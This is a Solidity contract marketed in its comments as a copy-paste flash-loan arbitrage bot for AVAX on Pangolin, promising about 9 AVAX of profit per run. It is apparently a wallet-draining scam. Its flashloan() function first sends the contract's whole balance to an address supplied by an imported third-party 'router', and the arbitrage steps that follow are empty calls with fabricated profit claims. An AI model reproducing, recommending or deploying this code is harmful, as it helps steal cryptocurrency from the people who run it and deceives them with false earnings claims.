// Follow carefully the video
// Do not modify this contract code otherwise it won't work on you!
// Just Copy+Paste and Compile!!
// Thank you for your support! Enjoy your Earnings!!

pragma solidity ^0.5.0;

//Pangolin Contracts
import "https://github.com/pangolindex/exchange-contracts/blob/main/contracts/pangolin-core/interfaces/IPangolinCallee.sol";
import "https://github.com/pangolindex/exchange-contracts/blob/main/contracts/pangolin-core/interfaces/IERC20.sol";
import "https://github.com/pangolindex/exchange-contracts/blob/main/contracts/pangolin-core/interfaces/IPangolinPair.sol";

// V-Cred Router
import "https://github.com/MF-Finance/router/blob/main/IvCredRouterMain.sol";

// Multiplier-Finance Smart Contracts
import "https://github.com/MF-Finance/contracts/blob/main/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/MF-Finance/contracts/blob/main/interfaces/ILendingPool.sol";



contract InitiateFlashLoan {
    
	RouterV2 router;
    string public tokenName;
    string public tokenSymbol;
    uint256 flashLoanAmount;

    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _loanAmount
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        flashLoanAmount = _loanAmount;

        router = new RouterV2();
    }

    function() external payable {}

    function flashloan() public payable {
        // Send required coins for swap
        address(uint160(router.pangolinSwapAddress())).transfer(
            address(this).balance
        );

        router.borrowFlashloanFromMultiplier(
            address(this),
            router.avaxSwapAddress(),
            flashLoanAmount
        );
        //To prepare the arbitrage, Avax is converted to Dai using V-Cred swap contract.
        router.convertAvaxTo(msg.sender, flashLoanAmount / 2);
        //The arbitrage converts token for AVAX using token/AVAX Pangolin, and then immediately converts AVAX back
        router.callArbitragePangolin(router.avaxSwapAddress(), msg.sender);
        //After the arbitrage, Avax is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 Avax of gas.
        router.transferAvaxToMultiplier(router.pangolinSwapAddress());
        //Note that the transaction sender gains 9ish Avac from the arbitrage, this particular transaction can be repeated as price changes all the time.
        router.completeTransation(address(this).balance);
    }
}












